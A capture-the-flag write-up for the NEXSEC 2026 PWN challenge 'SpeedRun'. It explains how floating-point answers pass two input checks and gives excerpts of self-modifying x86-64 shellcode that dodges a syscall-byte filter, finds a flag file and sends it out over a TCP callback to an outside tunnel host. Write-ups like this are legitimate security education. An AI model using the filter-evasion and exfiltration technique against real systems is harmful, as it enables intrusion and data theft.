# SpeedRun — NEXSEC 2026 CTF

| Field | Details |
| --- | --- |
| Team | Eureka |
| Category | PWN |
| Points | 495 |
| Service | `koala.nexsec.my:35028` |
| Technique | Floating-point input gates, self-modifying shellcode, file discovery, TCP callback |
| Status | Solved |

## Challenge

> please solve it asap so i can sleep peacefully.

Connecting to the remote service presented two questions before the program would accept machine code:

```text
=== speedrun ===
please solve it asap so i can sleep peacefully.

turn 1/2: what's the magic number, buddy?
>
turn 2/2: no. THE magic number.
>

[+] gate passed. the floor is yours.
send here, then up to 4096 bytes of code.
>
```

The objective was to get past these input checks, run code inside the challenge process, and obtain the flag. The challenge did not simply print the flag back to the original connection; the working approach used an outbound callback.

## Getting through the two checks

For the first prompt, the input `nan` worked. **The exact comparison in the challenge binary is not reproduced here**, so I am reporting the observed bypass rather than assuming its source-level implementation.

The second input was the decimal floating-point value:

```text
6.892987146013775e-42
```

When parsed as an IEEE-754 single-precision float, this has the bit representation `0x00001337`. The decimal value looks arbitrary, but its 32-bit representation reveals the intended *magic number* (`0x1337`).

The exploit script sends the two lines in order:

```python
s.sendall(b'nan\n')
s.sendall((MAGIC_FLOAT + '\n').encode())
```

Once both prompts were satisfied, the service allowed a payload of at most **4096 bytes**.

## Shellcode restriction and bypass

The submitted machine code could not contain the literal x86-64 syscall bytes `0f 05`. The solution used **self-modifying shellcode**: assemble the payload with the two bytes `0f 04` in place of each syscall, then patch those bytes after the shellcode starts running.

A simplified excerpt from the submitted assembly shows the patching loop:

```asm
_start:
    lea rbx, [rip+_start]
    lea rcx, [rip+payload_end]
patch_syscalls:
    cmp rbx, rcx
    jae patched
    cmp byte ptr [rbx], 0x0f
    jne nextbyte
    cmp byte ptr [rbx+1], 0x04
    jne nextbyte
    mov byte ptr [rbx+1], 0x05
    inc rbx
nextbyte:
    inc rbx
    jmp patch_syscalls
patched:
    ; syscall sites now contain 0f 05
```

The Python generator checked the produced bytes before submission:

```python
if b'\x0f\x05' in code:
    raise ValueError('banned opcode found in encoded shellcode')
if len(code) > 4096:
    raise ValueError('shellcode too long')
```

This distinction is important: the transmitted payload avoids the forbidden byte pattern, but the code modifies itself at runtime so it can still execute Linux system calls.

## Finding and extracting the flag

Rather than hard-code an unknown flag filename, the shellcode enumerated the current directory and looked for a filename starting with `flag-`.

Its main actions were:

1. Open the current directory (`.`) with `open`.
2. Read directory entries via `getdents64` (syscall 217).
3. Compare each directory-entry name against the `flag-` prefix.
4. Open the matching file and read up to `0x300` bytes.
5. Create a TCP socket, connect to the configured callback endpoint, and write the bytes to that socket.

The relevant filename prefix check is a literal part of the exploit:

```asm
lea r8, [rbx+19]
cmp dword ptr [r8], 0x67616c66  ; "flag" in little-endian order
jne next_dirent
cmp byte ptr [r8+4], 0x2d    ; '-'
jne next_dirent
```

The exploit generated a `sockaddr_in` structure using the callback hostname/IP and port supplied to the Python script, embedding it into the resulting shellcode.

## Delivery and result

The exploit connected to the TCP service, sent the two answers, then sent a **16-bit little-endian length** followed by the payload bytes:

```python
s.sendall(struct.pack('<H', len(code)) + code)
```

The recorded successful attempt used a **Pinggy TCP tunnel** as a publicly reachable callback destination. The shellcode was **314 bytes** long. After submission, the listening callback endpoint received the flag:

```text
[+] gate passed. the floor is yours.
[+] Shellcode sent!
[+] Listening for flag callback...

FLAG: nexsec26{Good___morning___or___perhaps___good___evening___everyone!!!}
```

A functioning externally accessible TCP listener is required to receive the callback. The callback hostname or IPv4 address and port must be embedded in the shellcode before submission.

## Step-by-step solution summary

1. Connect to the service and answer the first prompt with `nan`. This is the observed bypass; the exact comparison in the binary has not been reproduced in this write-up.
2. Answer the second prompt with `6.892987146013775e-42`, whose float32 representation is `0x1337`.
3. Prepare the payload described above, encoding syscall sites as `0f 04` and patching them to `0f 05` at runtime.
4. Supply an accessible TCP callback endpoint in the payload. The recorded solve used a Pinggy tunnel forwarding to a listening local TCP port.
5. Send the 16-bit little-endian payload length followed by the shellcode.
6. The payload discovers the `flag-` file, reads it, and returns its contents over the callback connection.
7. Read the flag from the callback listener. The original connection is used to deliver the payload.

## Supporting evidence and verification

The transcript in **Delivery and result** is the recorded successful solve, including the gate-passed message, callback result, and flag. It is historical evidence rather than output from a new execution.

The recovered solution code passed a Python syntax check. Offline assembly reproduced a **314-byte** payload for a test IPv4 callback endpoint, confirmed that the transmitted bytes contain no `0f 05` pattern, and checked the 4096-byte limit. Float32 conversion reproduced `0x00001337`.

The documented client needs Python 3 and GNU Binutils (`as` and `objcopy`) with x86-64 support; Linux or WSL is suitable. An externally reachable listener is required for the callback. Current remote service availability has not been checked.

## Flag

```text
nexsec26{Good___morning___or___perhaps___good___evening___everyone!!!}
```

## Takeaway

The interesting part of SpeedRun was not just recognizing `0x1337` in floating-point form. The final payload also needed to operate under a syscall-byte restriction and find a flag whose exact filename was unknown. Encoding syscall instructions until runtime, using `getdents64` for discovery, and returning the file over a TCP callback completed the chain.
